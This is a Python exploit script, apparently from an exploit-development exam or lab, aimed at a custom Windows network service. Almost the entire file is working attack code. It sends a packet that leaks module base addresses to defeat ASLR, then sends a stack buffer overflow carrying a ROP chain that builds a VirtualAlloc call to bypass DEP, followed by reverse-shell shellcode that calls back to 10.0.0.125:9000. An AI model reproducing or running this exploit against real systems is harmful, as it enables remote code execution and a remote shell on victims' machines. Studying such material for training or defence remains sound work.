from os import truncate
import socket
import struct
import sys
import time
from typing import List, SupportsIndex

sys.path.insert(1,"..\\AutomationForExam\\")

from ExploitAutomation import Pattern,Rop,Instructions

class Exploit():
    GET_ACTIVE_WINDOW_OPCODE = 0x304
    GET_COMPUTER_NAME_OPCODE = 0x305
    GET_STRING_BACK_OPCODE = 0x306
    GET_CURRENT_DIR_OPCODE = 0x307
    GET_STACK_ADDRESS_OPCODE = 0x308
    BYPASS_STACK_ADDRESSS_OPCODE_ERROR = 0x80
    WS2_32DLL_OFFSET_TO_BASE = 0x169c0
    def __init__(self,ip,port) -> None:
        self.ip = ip
        self.port = port
        self.max_payload_length = 1000
        self.offset_first_opcode = Pattern(996).pattern_offset(0x61413161)
        self.offset_control_error_bypass = Pattern(998).pattern_offset(0x61413161)
        self.offset_eip = Pattern(4988).pattern_offset(0x46326846)  # 4116
    
    def leak_exe_addr(self) -> int:
        leaking_payload = self.build_leak_payload()
        leaked_bytes = self.send_exploit(leaking_payload,True)
        return self.parse_leaked_addr(leaked_bytes)

    def build_leak_payload(self):
        payload = b""
        # xor length of payload by 33445566 to get checksum
        check_sum = self.max_payload_length ^ 0x33445566
        first_4_bytes = struct.pack("<L",check_sum)
        payload += first_4_bytes
        payload += b"A" * (self.offset_first_opcode)
        payload += struct.pack("<i",self.GET_STACK_ADDRESS_OPCODE)
        payload += b"B" * (self.offset_control_error_bypass)
        payload += struct.pack("<i",self.BYPASS_STACK_ADDRESSS_OPCODE_ERROR)
        payload += b"C" * (self.max_payload_length - len(payload))
        return payload
    
    def parse_leaked_addr(self,data: bytes) -> List[int]:
        addresses = []
        hex = data.hex()
        hex_opcodes = [hex[opcode] + hex[opcode+1] for opcode in range(0,len(hex)-1,2)]
        address_start_exe = 8 # always 8 bytes from start of buffer returned
        address_start_ws2_32 = 48
        address_start_mswsock = 36
        # get address of exe
        hex_addr = hex_opcodes[address_start_exe:address_start_exe+4]
        print("0x" + "".join(hex_addr[::-1]))
        int_addr = int("0x" + "".join(hex_addr[::-1]),16)
        addresses.append(int_addr)
        #get address of ws2_32
        hex_addr = hex_opcodes[address_start_ws2_32:address_start_ws2_32+4]
        print("0x" + "".join(hex_addr[::-1]))
        int_addr = int("0x" + "".join(hex_addr[::-1]),16)
        addresses.append(int_addr)
        # get address of mswSock
        hex_addr = hex_opcodes[address_start_mswsock:address_start_mswsock+4]
        print("0x" + "".join(hex_addr[::-1]))
        int_addr = int("0x" + "".join(hex_addr[::-1]),16)
        addresses.append(int_addr)
        return addresses



    def build_overflow_payload(self):
        payload = b""
        # xor length of payload by 33445566 to get checksum
        check_sum = 5000 ^ 0x33445566 #10000
        first_4_bytes = struct.pack("<L",check_sum)
        payload += first_4_bytes
        payload += b"A" * (self.offset_first_opcode)
        payload += struct.pack("<i",0x305)
        # virtual alloc skeleton
        virtualAlloc = struct.pack("<L",0x45454545) # virtual alloc
        virtualAlloc += struct.pack("<L",0x46464646) # shellcode return address
        virtualAlloc += struct.pack("<L",0x47474747) # dummy location of our shellcode
        virtualAlloc += struct.pack("<L",0x48484848) # dummy dwSize 
        virtualAlloc += struct.pack("<L",0x49494949) # dummy flAllocation Type
        virtualAlloc += struct.pack("<L",0x51515151) # dummy flProtect
        ### EIP OVERWRITE BELOW
        payload += b"B" * (self.offset_eip - len(virtualAlloc))
        # ROP SKELETON BELOW
        payload += virtualAlloc
        payload += struct.pack("<L",self.exe_base_addr + 0x11ef) # 0x301011ef:  mov eax, esp ; ret  ;  (1 found)
        payload += struct.pack("<L",self.exe_base_addr + 0x13b8) # 0x301013b8:  pop ecx ; ret  ;  (1 found)
        payload += struct.pack("<L", 0xffffffe4) # <- change me
        payload += struct.pack("<L",self.exe_base_addr + 0x4117) #0x30104117: add eax, ecx ; pop esi ; pop ebp ; ret  ;  (1 found)
        payload += struct.pack("<L",0x41414141) # junk
        payload += struct.pack("<L",0x41414141) # junk
        payload += struct.pack("<L",self.mswsock_base_addr + 0x183af)  ## mov eax into esi 0x4e3183af <- mswROP
        payload += struct.pack("<L",self.exe_base_addr + 0x3331)  #EXCHANGE EAX EBP needed so ebp doesnt cause issues
        payload += struct.pack("<L",self.exe_base_addr + 0x2d05)  # 0xx30102d05: pop edi ; ret  ;  (1 found)
        payload += struct.pack("<L",self.exe_base_addr + 0x14018) # POINTER TO virtual alloc address
        payload += struct.pack("<L",self.exe_base_addr + 0x13b8) # 0x301013b8:  pop ecx ; ret  ;  (1 found)
        payload += struct.pack("<L",0xfffffcb0) # <- change me
        payload += struct.pack("<L",self.exe_base_addr + 0x11ef) # 0x301011ef:  mov eax, esp ; ret  ;  (1 found)
        payload += struct.pack("<L",self.exe_base_addr + 0x5e69)  # 0x30105e69: sub ecx, eax ; mov eax, dword [ebp+0x08] ; ror eax, cl ; xor eax, dword [0x3011B018] ; pop ebp ; ret  ;  (1 found)
        payload += struct.pack("<L",0x41414141) # junk
        payload += struct.pack("<L",self.exe_base_addr + 0x172c ) # 0x3010172c:  mov eax, ecx ; ret  ;  (1 found)
        payload += struct.pack("<L",self.exe_base_addr + 0x9b44)  # 0x30109b44: neg eax ; pop ebp ; ret  ;  (1 found)
        payload += struct.pack("<L",0x41414141) # junk
        payload += struct.pack("<L",self.mswsock_base_addr + 0x327ae)   # 0x4e3327ae:  mov ecx, eax ; mov eax, ecx ; pop ebp ; ret  ;  (1 found) <------------------------------
        payload += struct.pack("<L",0x41414141) # junk
        payload += struct.pack("<L",self.exe_base_addr + 0x41b9) # 0x301041b9 dereference EDI into eax
        payload += struct.pack("<L",0x41414141) # junk
        payload += struct.pack("<L",0x41414141) # junk
        payload += struct.pack("<L",self.exe_base_addr + 0x777f)  # 0x3010777f: mov dword [esi], eax ; pop esi ; pop ebp ; ret  ;  (1 found)
        payload += struct.pack("<L",0x41414141) # junk
        payload += struct.pack("<L",0x41414141) # junk
        #### VIRTUAL ALLOC ADDRESS DONE
        payload += struct.pack("<L",self.exe_base_addr + 0x11ef) # 0x301011ef:  mov eax, esp ; ret  ;  (1 found)
        payload += struct.pack("<L",self.exe_base_addr + 0x13b8) # 0x301013b8:  pop ecx ; ret  ;  (1 found)
        payload += struct.pack("<L", 0xffffff80) # <- change me
        payload += struct.pack("<L",self.exe_base_addr + 0x4117) #0x30104117: add eax, ecx ; pop esi ; pop ebp ; ret  ;  (1 found)
        payload += struct.pack("<L",0x41414141) # junk
        payload += struct.pack("<L",0x41414141) # junk
        payload += struct.pack("<L",self.mswsock_base_addr + 0x183af)  ## mov eax into esi 0x4e3183af <- mswROP
        payload += struct.pack("<L",self.exe_base_addr + 0x3331) #EXCHANGE EAX EBP needed so ebp doesnt cause issues
        payload += struct.pack("<L",self.exe_base_addr +  0x11ef)  # 0x301011ef:  mov eax, esp ; ret  ;  (1 found)
        payload += struct.pack("<L",self.exe_base_addr + 0x13b8) # 0x301013b8:  pop ecx ; ret  ;  (1 found)
        payload += struct.pack("<L", 0xfffffea8) # <- change me
        payload += struct.pack("<L",self.exe_base_addr + 0x5e69)  # 0x30105e69: sub ecx, eax ; mov eax, dword [ebp+0x08] ; ror eax, cl ; xor eax, dword [0x3011B018] ; pop ebp ; ret  ;  (1 found)
        payload += struct.pack("<L",0x41414141) # junk
        payload += struct.pack("<L",self.exe_base_addr + 0x172c ) # 0x3010172c:  mov eax, ecx ; ret  ;  (1 found)
        payload += struct.pack("<L",self.exe_base_addr + 0x9b44)  # 0x30109b44: neg eax ; pop ebp ; ret  ;  (1 found)
        payload += struct.pack("<L",0x41414141) # junk
        payload += struct.pack("<L",self.exe_base_addr + 0x777f)  # 0x3010777f: mov dword [esi], eax ; pop esi ; pop ebp ; ret  ;  (1 found)
        payload += struct.pack("<L",0x41414141) # junk
        payload += struct.pack("<L",0x41414141) # junk
        ### SHELLCODE RET DONE
        payload += struct.pack("<L",self.exe_base_addr + 0x11ef) # 0x301011ef:  mov eax, esp ; ret  ;  (1 found)
        payload += struct.pack("<L",self.exe_base_addr + 0x13b8) # 0x301013b8:  pop ecx ; ret  ;  (1 found)
        payload += struct.pack("<L", 0xffffff38) # <- change me
        payload += struct.pack("<L",self.exe_base_addr + 0x4117) #0x30104117: add eax, ecx ; pop esi ; pop ebp ; ret  ;  (1 found)
        payload += struct.pack("<L",0x41414141) # junk
        payload += struct.pack("<L",0x41414141) # junk
        payload += struct.pack("<L",self.mswsock_base_addr + 0x183af)  ## mov eax into esi 0x4e3183af <- mswROP
        payload += struct.pack("<L",self.exe_base_addr + 0x3331) #EXCHANGE EAX EBP needed so ebp doesnt cause issues
        payload += struct.pack("<L",self.exe_base_addr +  0x11ef)  # 0x301011ef:  mov eax, esp ; ret  ;  (1 found)
        payload += struct.pack("<L",self.exe_base_addr + 0x13b8) # 0x301013b8:  pop ecx ; ret  ;  (1 found)
        payload += struct.pack("<L", 0xffffff6c) # <- change me
        payload += struct.pack("<L",self.exe_base_addr + 0x5e69)  # 0x30105e69: sub ecx, eax ; mov eax, dword [ebp+0x08] ; ror eax, cl ; xor eax, dword [0x3011B018] ; pop ebp ; ret  ;  (1 found)
        payload += struct.pack("<L",0x41414141) # junk
        payload += struct.pack("<L",self.exe_base_addr + 0x172c ) # 0x3010172c:  mov eax, ecx ; ret  ;  (1 found)
        payload += struct.pack("<L",self.exe_base_addr + 0x9b44)  # 0x30109b44: neg eax ; pop ebp ; ret  ;  (1 found)
        payload += struct.pack("<L",0x41414141) # junk
        payload += struct.pack("<L",self.exe_base_addr + 0x777f)  # 0x3010777f: mov dword [esi], eax ; pop esi ; pop ebp ; ret  ;  (1 found)
        payload += struct.pack("<L",0x41414141) # junk
        payload += struct.pack("<L",0x41414141) # junk
        ## LP ADDRESS DONE
        payload += struct.pack("<L",self.exe_base_addr + 0x11ef) # 0x301011ef:  mov eax, esp ; ret  ;  (1 found)
        payload += struct.pack("<L",self.exe_base_addr + 0x13b8) # 0x301013b8:  pop ecx ; ret  ;  (1 found)
        payload += struct.pack("<L", 0xfffffef0) # <- change me
        payload += struct.pack("<L",self.exe_base_addr + 0x4117) #0x30104117: add eax, ecx ; pop esi ; pop ebp ; ret  ;  (1 found)
        payload += struct.pack("<L",0x41414141) # junk
        payload += struct.pack("<L",0x41414141) # junk
        payload += struct.pack("<L",self.mswsock_base_addr + 0x183af)    # mov eax into esi 0x4e3183af <- mswROP
        payload += struct.pack("<L",self.exe_base_addr + 0x1360e)         # 0x3011360e: pop ebx ; xor eax, eax ; ret  ;  (1 found)
        payload += struct.pack("<L",0x41414141) # junk
        payload += struct.pack("<L",self.exe_base_addr + 0xfcd9)         # 0x3010fcd9: inc eax ; ret  ;  (1 found)
        payload += struct.pack("<L",self.exe_base_addr + 0x777f)         # 0x3010777f: mov dword [esi], eax ; pop esi ; pop ebp ; ret  ;  (1 found)
        payload += struct.pack("<L",0x41414141) # junk
        payload += struct.pack("<L",0x41414141) # junk
        # 0x01 DONE
        payload += struct.pack("<L",self.exe_base_addr + 0x11ef) # 0x301011ef:  mov eax, esp ; ret  ;  (1 found)
        payload += struct.pack("<L",self.exe_base_addr + 0x13b8) # 0x301013b8:  pop ecx ; ret  ;  (1 found)
        payload += struct.pack("<L", 0xfffffec0) # <- change me
        payload += struct.pack("<L",self.exe_base_addr + 0x4117) #0x30104117: add eax, ecx ; pop esi ; pop ebp ; ret  ;  (1 found)
        payload += struct.pack("<L",0x41414141) # junk
        payload += struct.pack("<L",0x41414141) # junk
        payload += struct.pack("<L",self.mswsock_base_addr + 0x183af)  ## mov eax into esi 0x4e3183af <- mswROP
        payload += struct.pack("<L",self.exe_base_addr + 0x3331) #XCHANGE EAX EBP
        payload += struct.pack("<L",self.ws32_base_addr + 0x42d5d) # pop eax ; ret  ;  (1 found) <- wsROP.txt
        payload += struct.pack("<L",0x80807080)
        payload += struct.pack("<L",self.exe_base_addr + 0x13b8)  # 0x301013b8:  pop ecx ; ret  ;  (1 found)
        payload += struct.pack("<L",0x80808080)
        payload += struct.pack("<L",self.exe_base_addr + 0x5e69)  # 0x30105e69: sub ecx, eax ; mov eax, dword [ebp+0x08] ; ror eax, cl ; xor eax, dword [0x3011B018] ; pop ebp ; ret  ;  (1 found)
        payload += struct.pack("<L",0x41414141) # junk
        payload += struct.pack("<L",self.exe_base_addr + 0x172c ) # 0x3010172c:  mov eax, ecx ; ret  ;  (1 found)
        payload += struct.pack("<L",self.exe_base_addr + 0x777f)  # 0x3010777f: mov dword [esi], eax ; pop esi ; pop ebp ; ret  ;  (1 found)
        payload += struct.pack("<L",0x41414141) # junk
        payload += struct.pack("<L",0x41414141) # junk
        # 0x1000 done
        payload += struct.pack("<L",self.exe_base_addr + 0x11ef) # 0x301011ef:  mov eax, esp ; ret  ;  (1 found)
        payload += struct.pack("<L",self.exe_base_addr + 0x13b8) # 0x301013b8:  pop ecx ; ret  ;  (1 found)
        payload += struct.pack("<L", 0xfffffe7c) # <- change me
        payload += struct.pack("<L",self.exe_base_addr + 0x4117) #0x30104117: add eax, ecx ; pop esi ; pop ebp ; ret  ;  (1 found)
        payload += struct.pack("<L",0x41414141) # junk
        payload += struct.pack("<L",0x41414141) # junk
        payload += struct.pack("<L",self.mswsock_base_addr + 0x183af)  ## mov eax into esi 0x4e3183af <- mswROP
        payload += struct.pack("<L",self.exe_base_addr + 0x3331) #XCHANGE EAX EBP
        payload += struct.pack("<L",self.ws32_base_addr + 0x42d5d) # pop eax ; ret  ;  (1 found) <- wsROP.txt
        payload += struct.pack("<L",0x80808040)
        payload += struct.pack("<L",self.exe_base_addr + 0x13b8)  # 0x301013b8:  pop ecx ; ret  ;  (1 found)
        payload += struct.pack("<L",0x80808080)
        payload += struct.pack("<L",self.exe_base_addr + 0x5e69)  # 0x30105e69: sub ecx, eax ; mov eax, dword [ebp+0x08] ; ror eax, cl ; xor eax, dword [0x3011B018] ; pop ebp ; ret  ;  (1 found)
        payload += struct.pack("<L",0x41414141) # junk
        payload += struct.pack("<L",self.exe_base_addr + 0x172c ) # 0x3010172c:  mov eax, ecx ; ret  ;  (1 found)
        payload += struct.pack("<L",self.exe_base_addr + 0x777f)  # 0x3010777f: mov dword [esi], eax ; pop esi ; pop ebp ; ret  ;  (1 found)
        payload += struct.pack("<L",0x41414141) # junk
        payload += struct.pack("<L",0x41414141) # junk
        # 0x40 done
        payload += struct.pack("<L",self.exe_base_addr + 0x11ef) # 0x301011ef:  mov eax, esp ; ret  ;  (1 found)
        payload += struct.pack("<L",self.exe_base_addr + 0x13b8) # 0x301013b8:  pop ecx ; ret  ;  (1 found)
        payload += struct.pack("<L", 0xfffffe1c) ## <- change me
        payload += struct.pack("<L",self.exe_base_addr + 0x4117) #0x30104117: add eax, ecx ; pop esi ; pop ebp ; ret  ;  (1 found)
        payload += struct.pack("<L",0x41414141) # junk
        payload += struct.pack("<L",0x41414141) # junk
        payload += struct.pack("<L",self.exe_base_addr + 0x3331) # EXCHANGE EAX EBP
        payload += struct.pack("<L",self.exe_base_addr + 0x1040) ## 0x30101040: mov esp, ebp ; pop ebp ; ret  ;  (1 found)
        # call virtual alloc
        payload += b"\x90" * (14)
        ## shellcode further down the stack ##
        payload += Instructions.create_rev_shellcode("10.0.0.125",9000)
        payload += b"\x90" * (5000 - len(payload))
        print(len(payload))
        if len(payload) > 5000:
            print("too big")
            sys.exit()
        return payload

    def execute_buffer_overflow(self):
        overflow_payload = self.build_overflow_payload()
        self.send_exploit(overflow_payload,False)

    def send_exploit(self,payload,leak_mode) -> bool:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            s.connect((self.ip,self.port))
            print(f"Sending payload length {len(payload)}")
            s.send(payload)
            if not leak_mode:
                return True
            time.sleep(1)
            data = s.recv(1024)
            s.close()
            return data
        except Exception as e:
            print("Failed to exploit")
            print (e)
            return False

    def main(self):
        addrs = self.leak_exe_addr()
        exe_addr, ws32_adr, mswSock_addr = addrs[0], addrs[1], addrs[2]
        self.mswsock_base_addr = mswSock_addr - 0x15c40
        self.ws32_base_addr = ws32_adr - 0x169c0
        self.exe_base_addr = exe_addr -  0x1e70
        self.address_of_virtual_alloc = self.exe_base_addr + 0x14018 
        print(f"Found base address of ws2_32.dll  -> {hex(self.ws32_base_addr)}")
        print(f"Found base address of mswsock.dll => {hex(self.mswsock_base_addr)}")
        print(f"Found base address of exe  -> {hex(self.exe_base_addr)}")
        print(f"Found ptr to virtual alloc -> {hex(self.address_of_virtual_alloc)}")
        print(f"Attempting buffer overflow")
        self.execute_buffer_overflow()

if __name__ == "__main__":
    Exploit("10.0.0.185",1234).main()